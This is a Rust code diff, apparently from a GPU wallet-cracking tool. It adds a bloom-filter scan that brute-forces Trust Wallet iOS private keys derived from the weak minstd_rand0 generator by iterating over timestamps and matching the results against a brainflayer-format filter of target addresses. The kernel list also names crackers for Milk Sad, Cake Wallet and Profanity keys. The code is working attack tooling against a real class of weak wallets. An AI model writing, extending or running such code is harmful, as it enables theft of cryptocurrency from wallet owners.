@@ -104,7 +104,8 @@ impl KernelProfile {
                 "mt19937_64",
                 "batch_profanity",
                 "trust_wallet_crack",
-                "trust_wallet_lcg_crack",   // Trust Wallet iOS / minstd_rand0 LCG
+                "trust_wallet_lcg_crack",   // Trust Wallet iOS / minstd_rand0 LCG — single target
+                "trust_wallet_lcg_crack_bloom", // Trust Wallet iOS / minstd_rand0 LCG — bloom filter
 				"cake_wallet_crack",
                 "milk_sad_crack",
                 "test_mt19937",
@@ -242,7 +243,7 @@ impl GpuSolver {
 
         let device = pro_que.device();
         let queue = pro_que.queue().clone();
-        let context = pro_que.context().clone();
+        let _context = pro_que.context().clone();
 		let program = pro_que.program().clone();
 
         let consts = GpuConstBuffers::new(&queue)?;
@@ -943,6 +944,120 @@ impl GpuSolver {
             {
                 error!(
                     "[GPU:LCG] Kernel failed: {} (global={}, local={}, ts={}-{})",
+                    e, global, local, start_timestamp, end_timestamp
+                );
+                return Err(e);
+            }
+        }
+
+        let mut count_vec = vec![0u32; 1];
+        buffer_count.read(&mut count_vec).enq()?;
+        let count = (count_vec[0] as usize).min(MAX_RESULTS);
+
+        if count == 0 {
+            return Ok(Vec::new());
+        }
+
+        let mut raw = vec![0u64; MAX_RESULTS];
+        buffer_results.read(&mut raw).enq()?;
+
+        let results = raw[..count]
+            .iter()
+            .map(|&v| {
+                let timestamp = (v & 0xFFFF_FFFF) as u32;
+                let combo     = (v >> 32) as u32;
+                (timestamp, combo)
+            })
+            .collect();
+
+        Ok(results)
+    }
+
+    /// Trust Wallet iOS — minstd_rand0 (LCG) bloom filter scan
+    ///
+    /// Uploads a brainflayer-compatible raw bit-array bloom filter (512 MB,
+    /// no header) to the GPU and checks all `range × 6` combos against it.
+    ///
+    /// ## Bloom format (k=5, brainflayer / hex2blf)
+    /// Each hash160 checks 5 bit positions derived from the 5 consecutive
+    /// LE `uint32` values at `hash160[i*4..i*4+4]` for `i` in 0..5.
+    ///
+    /// ## False positives
+    /// The kernel caps results at 4096 — matching the `if (slot < 4096u)`
+    /// guard in `trust_wallet_lcg_crack_bloom.cl`.  Callers (`run_bloom`)
+    /// must re-derive on CPU and filter against the real address set.
+    ///
+    /// ## Returns
+    /// `Vec<(timestamp, combo)>` — same layout as `compute_trust_wallet_lcg_crack`.
+    pub fn compute_trust_wallet_lcg_bloom(
+        &self,
+        start_timestamp: u32,
+        end_timestamp: u32,
+        bloom_data: &[u8],
+    ) -> ocl::Result<Vec<(u32, u32)>> {
+        let kernel_name = "trust_wallet_lcg_bloom";
+
+        // MAX_RESULTS must match the `slot < 4096u` cap in the .cl kernel.
+        const MAX_RESULTS: usize = 4096;
+
+        // Upload bloom filter as a read-only device buffer.
+        info!(
+            "[GPU:BLOOM] Uploading bloom filter ({} MB)…",
+            bloom_data.len() / 1_048_576
+        );
+        let bloom_buf = Buffer::<u8>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_only().alloc_host_ptr().copy_host_ptr())
+            .len(bloom_data.len())
+            .copy_host_slice(bloom_data)
+            .build()?;
+
+        let buffer_results = Buffer::<u64>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(MAX_RESULTS)
+            .build()?;
+
+        let buffer_count = Buffer::<u32>::builder()
+            .queue(self.pro_que.queue().clone())
+            .flags(MemFlags::new().read_write().alloc_host_ptr())
+            .len(1)
+            .build()?;
+        buffer_count.write(&vec![0u32]).enq()?;
+
+        // Global work size: 6 combos per timestamp.
+        let range      = (end_timestamp - start_timestamp) as usize;
+        let raw_global = range * 6;
+        let local      = self.max_work_group_size.min(256);
+        let global     = raw_global.div_ceil(local) * local;
+
+        info!(
+            "[GPU:BLOOM] {} timestamps × 6 combos → {} work items (local={})",
+            range, raw_global, local
+        );
+
+        // Kernel signature: (results, result_count, bloom, offset, range)
+        let kernel = self
+            .pro_que
+            .kernel_builder(kernel_name)
+            .arg(&buffer_results)   // __global ulong* results
+            .arg(&buffer_count)     // __global uint*  result_count
+            .arg(&bloom_buf)        // __global const uchar* bloom
+            .arg(start_timestamp)   // uint offset
+            .arg(range as u32)      // uint range
+            .global_work_size(global)
+            .local_work_size(local)
+            .build()?;
+
+        unsafe {
+            if let Err(e) = kernel
+                .cmd()
+                .global_work_size(global)
+                .local_work_size(local)
+                .enq()
+            {
+                error!(
+                    "[GPU:BLOOM] Kernel failed: {} (global={}, local={}, ts={}-{})",
                     e, global, local, start_timestamp, end_timestamp
                 );
                 return Err(e);
